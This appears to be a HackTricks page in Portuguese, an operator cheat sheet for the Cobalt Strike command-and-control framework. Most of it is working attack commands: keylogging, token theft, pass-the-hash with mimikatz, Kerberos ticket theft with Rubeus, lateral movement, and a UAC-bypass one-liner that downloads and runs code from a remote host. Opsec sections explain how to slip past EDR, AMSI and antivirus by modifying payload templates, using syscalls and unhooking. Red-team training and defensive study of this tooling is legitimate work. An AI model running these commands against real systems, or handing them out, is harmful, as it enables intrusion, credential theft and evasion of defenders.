# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` então você pode selecionar onde escutar, que tipo de beacon usar (http, dns, smb...) e mais.

### Peer2Peer Listeners

Os beacons desses listeners não precisam falar com o C2 diretamente; eles podem se comunicar com ele através de outros beacons.

`Cobalt Strike -> Listeners -> Add/Edit` então você deve selecionar os beacons TCP ou SMB

* O **TCP beacon irá configurar um listener na porta selecionada**. Para conectar a um TCP beacon use o comando `connect <ip> <port>` a partir de outro beacon
* O **smb beacon ficará escutando em um pipename com o nome selecionado**. Para conectar a um SMB beacon você precisa usar o comando `link [target] [pipe]`.

### Gerar & Hospedar payloads

#### Gerar payloads em arquivos

`Attacks -> Packages ->`

* **`HTMLApplication`** para arquivos HTA
* **`MS Office Macro`** para um documento do Office com macro
* **`Windows Executable`** para um .exe, .dll ou service .exe
* **`Windows Executable (S)`** para um **stageless** .exe, .dll ou service .exe (melhor stageless do que staged, menos IoCs)

#### Gerar & Hospedar payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Isto irá gerar um script/executável para baixar o beacon do cobalt strike em formatos como: bitsadmin, exe, powershell e python

#### Hospedar Payloads

Se você já tem o arquivo que deseja hospedar em um servidor web, vá em `Attacks -> Web Drive-by -> Host File` e selecione o arquivo a hospedar e a configuração do web server.

### Beacon Options

<details>
<summary>Opções e comandos do Beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Implantes personalizados / Linux Beacons

- Um agente personalizado só precisa falar o protocolo HTTP/S do Cobalt Strike Team Server (malleable C2 profile padrão) para registrar/check-in e receber tarefas. Implemente os mesmos URIs/headers/metadata/crypto definidos no profile para reutilizar a UI do Cobalt Strike para tasking e output.
- Um Aggressor Script (ex.: `CustomBeacon.cna`) pode encapsular a geração de payloads para o beacon non-Windows para que os operadores possam selecionar o listener e produzir ELF payloads diretamente da GUI.
- Exemplo de handlers de tarefas Linux expostos ao Team Server: `sleep`, `cd`, `pwd`, `shell` (executa comandos arbitrários), `ls`, `upload`, `download`, e `exit`. Estes mapeiam para os IDs de tarefa esperados pelo Team Server e devem ser implementados no lado do servidor para retornar a saída no formato apropriado.
- Suporte a BOF no Linux pode ser adicionado carregando Beacon Object Files in-process com [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (também suporta BOFs no estilo Outflank), permitindo post-exploitation modular rodar dentro do contexto/privilegios do implant sem spawnar novos processos.
- Embeda um handler SOCKS no beacon customizado para manter paridade de pivot com Windows Beacons: quando o operador executar `socks <port>` o implant deve abrir um proxy local para rotear as ferramentas do operador através do host Linux comprometido para redes internas.

## Opsec

### Execute-Assembly

O **`execute-assembly`** usa um **processo sacrificial** utilizando remote process injection para executar o programa indicado. Isso é muito ruidoso, pois para injetar dentro de um processo são usadas certas Win APIs que todo EDR verifica. No entanto, existem algumas ferramentas customizadas que podem ser usadas para carregar algo no mesmo processo:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike you can also use BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

O aggressor script `https://github.com/outflanknl/HelpColor` criará o comando `helpx` no Cobalt Strike que colocará cores nos comandos indicando se eles são BOFs (verde), se são Frok&Run (amarelo) e similares, ou se são ProcessExecution, injection ou similares (vermelho). Isso ajuda a saber quais comandos são mais furtivos.

### Act as the user

Você pode checar eventos como `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Verifique todos os logons interativos para conhecer o horário usual de operação.
- System EID 12,13 - Verifique a frequência de shutdown/startup/sleep.
- Security EID 4624/4625 - Verifique tentativas de NTLM válidas/inválidas de entrada.
- Security EID 4648 - Este evento é criado quando credenciais em plaintext são usadas para logon. Se um processo o gerou, o binário potencialmente tem as credenciais em texto claro em um arquivo de configuração ou dentro do código.

Ao usar `jump` a partir do cobalt strike, é melhor usar o método `wmi_msbuild` para fazer o novo processo parecer mais legítimo.

### Use computer accounts

É comum que os defensores verifiquem comportamentos estranhos gerados por usuários e **excluam contas de serviço e contas de computador como `*$` do seu monitoramento**. Você pode usar essas contas para realizar movimento lateral ou elevação de privilégios.

### Use stageless payloads

Stageless payloads são menos ruidosos que os staged porque não precisam baixar um segundo estágio do servidor C2. Isso significa que eles não geram tráfego de rede após a conexão inicial, tornando-os menos propensos a serem detectados por defesas baseadas em rede.

### Tokens & Token Store

Tenha cuidado ao roubar ou gerar tokens porque pode ser possível para um EDR enumerar todos os tokens de todas as threads e encontrar um **token pertencente a um usuário diferente** ou até SYSTEM no processo.

Isso permite armazenar tokens **per beacon** para que não seja necessário roubar o mesmo token repetidas vezes. Isso é útil para movimento lateral ou quando você precisa usar um token roubado múltiplas vezes:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Ao mover-se lateralmente, geralmente é melhor **roubar um token do que gerar um novo** ou realizar um ataque pass the hash.

### Guardrails

Cobalt Strike tem um recurso chamado **Guardrails** que ajuda a prevenir o uso de certos comandos ou ações que podem ser detectados pelos defensores. Guardrails pode ser configurado para bloquear comandos específicos, como `make_token`, `jump`, `remote-exec`, e outros comumente usados para movimento lateral ou elevação de privilégios.

Além disso, o repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) também contém algumas checagens e ideias que você pode considerar antes de executar um payload.

### Tickets encryption

Em um AD tenha cuidado com a criptografia dos tickets. Por padrão, algumas ferramentas usarão RC4 para criptografar tickets Kerberos, o que é menos seguro que AES e, por padrão, ambientes atualizados usarão AES. Isso pode ser detectado por defensores que monitoram por algoritmos de criptografia fracos.

### Avoid Defaults

Ao usar Cobalt Stricke por padrão os pipes SMB terão o nome `msagent_####` e `status_####`. Mude esses nomes. É possível checar os nomes dos pipes existentes no Cobalt Strike com o comando: `ls \\.\pipe\`

Além disso, em sessões SSH é criado um pipe chamado `\\.\pipe\postex_ssh_####`. Altere-o com `set ssh_pipename "<new_name>";`.

Também em poext exploitation attack os pipes `\\.\pipe\postex_####` podem ser modificados com `set pipename "<new_name>"`.

Em Cobalt Strike profiles você também pode modificar coisas como:

- Evitar usar `rwx`
- Como o comportamento de process injection funciona (quais APIs serão usadas) no bloco `process-inject {...}`
- Como o "fork and run" funciona no bloco `post-ex {…}`
- O tempo de sleep
- O tamanho máximo de binários a serem carregados em memória
- A pegada de memória e conteúdo de DLL com o bloco `stage {...}`
- O tráfego de rede

### Bypass memory scanning

Alguns EDRs escaneiam a memória procurando por assinaturas de malware conhecidas. Cobalt Strike permite modificar a função `sleep_mask` como um BOF que será capaz de criptografar em memória o backdoor.

### Noisy proc injections

Ao injetar código em um processo isso geralmente é muito ruidoso, porque **nenhum processo normal costuma realizar essa ação e as formas de fazê-lo são muito limitadas**. Portanto, isso pode ser detectado por sistemas de detecção baseados em comportamento. Além disso, também pode ser detectado por EDRs que escaneiam por **threads contendo código que não está no disco** (embora processos como navegadores que usam JIT façam isso com frequência). Exemplo: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Ao spawnar um novo processo é importante **manter uma relação pai-filho regular** entre processos para evitar detecção. Se svchost.exec estiver executando iexplorer.exe isso parecerá suspeito, pois svchost.exe não é pai de iexplorer.exe em um ambiente Windows normal.

Quando um novo beacon é spawnado no Cobalt Strike por padrão é criado um processo usando **`rundll32.exe`** para rodar o novo listener. Isso não é muito stealthy e pode ser facilmente detectado por EDRs. Além disso, `rundll32.exe` é executado sem args, tornando-o ainda mais suspeito.

Com o seguinte comando do Cobalt Strike, você pode especificar um processo diferente para spawnar o novo beacon, tornando-o menos detectável:
```bash
spawnto x86 svchost.exe
```
Você também pode alterar essa configuração **`spawnto_x86` e `spawnto_x64`** em um perfil.

### Encaminhando o tráfego dos atacantes

Às vezes os atacantes precisarão executar ferramentas localmente, até em máquinas Linux, e fazer com que o tráfego das vítimas alcance a ferramenta (por exemplo, NTLM relay).

Além disso, às vezes, para realizar um ataque pass-the.hash ou pass-the-ticket é mais furtivo para o atacante **adicionar esse hash ou ticket no seu próprio processo LSASS** localmente e então pivot a partir dele em vez de modificar o processo LSASS de uma máquina vítima.

No entanto, você precisa ser **cuidadoso com o tráfego gerado**, pois pode estar enviando tráfego incomum (Kerberos?) do seu processo backdoor. Para isso você poderia pivot para um processo de navegador (embora você possa ser pego ao injetar-se em um processo, então pense em uma forma stealth de fazer isso).


### Evitando AVs

#### AV/AMSI/ETW Bypass

Confira a página:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Normalmente, em `/opt/cobaltstrike/artifact-kit` você pode encontrar o código e os templates pré-compilados (em `/src-common`) dos payloads que cobalt strike vai usar para gerar os beacons binários.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) com o backdoor gerado (ou apenas com o template compilado) você pode descobrir o que está fazendo o defender disparar. Normalmente é uma string. Portanto, você pode simplesmente modificar o código que gera o backdoor para que essa string não apareça no binário final.

Depois de modificar o código, apenas execute `./build.sh` a partir do mesmo diretório e copie a pasta `dist-pipe/` para o cliente Windows em `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Não se esqueça de carregar o script agressivo `dist-pipe\artifact.cna` para indicar ao Cobalt Strike que use os recursos do disco que queremos e não os carregados.

#### Kit de Recursos

A pasta ResourceKit contém os modelos para os payloads baseados em script do Cobalt Strike, incluindo PowerShell, VBA e HTA.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) com os modelos, você pode descobrir o que o defender (AMSI neste caso) não aceita e modificá-lo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Ao modificar as linhas detectadas, é possível gerar um template que não será detectado.

Não esqueça de carregar o script agressivo `ResourceKit\resources.cna` para indicar ao Cobalt Strike que use os recursos do disco que queremos e não os que estão carregados.

#### Function hooks | Syscall

Function hooking é um método muito comum de EDRs para detectar atividade maliciosa. O Cobalt Strike permite contornar esses hooks usando **syscalls** em vez das chamadas padrão do Windows API com a configuração **`None`**, ou usar a versão `Nt*` de uma função com a opção **`Direct`**, ou simplesmente pular a função `Nt*` com a opção **`Indirect`** no malleable profile. Dependendo do sistema, uma opção pode ser mais stealth do que outra.

Isso pode ser definido no profile ou usando o comando **`syscall-method`**

No entanto, isso também pode gerar ruído.

Uma opção fornecida pelo Cobalt Strike para contornar function hooks é remover esses hooks com: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Você também pode verificar quais funções estão hookadas com [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ou [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Comandos diversos do Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Referências

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
